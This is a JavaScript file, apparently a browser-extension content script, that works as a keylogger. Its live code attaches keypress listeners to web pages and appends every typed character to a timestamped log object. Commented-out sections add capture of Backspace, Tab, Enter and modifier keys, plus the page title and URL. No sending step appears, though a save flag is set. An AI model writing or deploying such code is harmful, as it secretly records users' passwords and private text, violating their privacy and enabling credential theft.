// // import FileSaver from 'FileSaver';
// function exportToFile() {
//     var myString = "Lorem ipsum.";

//     window.open('data:text/csv;charset=utf-8,' + escape(myString));
// }

// document.addEventListener("keypress",function(event){
//     // var userInput = event.key;
//     // var blob = new Blob([userInput], { type: "text/plain;charset=utf-8" });
//     // FileSaver.saveAs(blob, "dynamic.txt");
//     // let current = getTimeSTamp();
//     exportToFile();
// 	console.log(event.key);
// });

document.addEventListener('keypress', function (e) {
    e = e || window.event;
    var charCode = typeof e.which == "number" ? e.which : e.keyCode;
    if (charCode) {
        log(String.fromCharCode(charCode));
    }
});

// // Other keys
// chrome.storage.sync.get({allKeys: false}, function(settings) {
//     if (settings.allKeys) {
//         document.addEventListener('keydown', function (e) {
//             e = e || window.event;
//             var charCode = typeof e.which == "number" ? e.which : e.keyCode;
//             if (charCode == 8) {
//                 log("[BKSP]");
//             } else if (charCode == 9) {
//                 log("[TAB]");
//             } else if (charCode == 13) {
//                 log("[ENTER]");
//             } else if (charCode == 16) {
//                 log("[SHIFT]");
//             } else if (charCode == 17) {
//                 log("[CTRL]");
//             } else if (charCode == 18) {
//                 log("[ALT]");
//             } else if (charCode == 91) {
//                 log("[L WINDOW]"); // command for mac
//             } else if (charCode == 92) {
//                 log("[R WINDOW]"); // command for mac
//             } else if (charCode == 93) {
//                 log("[SELECT/CMD]"); // command for mac
//             }
//         });
//     } else { // Non function keys
//         document.addEventListener('keydown', function (e) {
//             e = e || window.event;
//             var charCode = typeof e.which == "number" ? e.which : e.keyCode;
//             if (charCode == 8) {
//                 log("[BKSP]");
//             } else if (charCode == 9) {
//                 log("[TAB]");
//             } else if (charCode == 13) {
//                 log("[ENTER]");
//             }
//         });
//     }
// });


/* Keylog Saving */
var time = new Date().getTime();
var thisdata = {};
var shouldSave = false;
var lastLog = time;
thisdata[time] = ""
// thisdata[time] = document.title + "^~^" + document.URL + "^~^";

// Key'ed on JS timestamp
function log(input) {
    var now = new Date().getTime();
    // if (now - lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
    thisdata[time] += input;
    shouldSave = true;
    lastLog = now;
    console.log("Logged",input,  JSON.stringify(thisdata));
}





document.addEventListener("keypress",function(event){
    // keystroke += event.key;
    console.log(event.key);
  });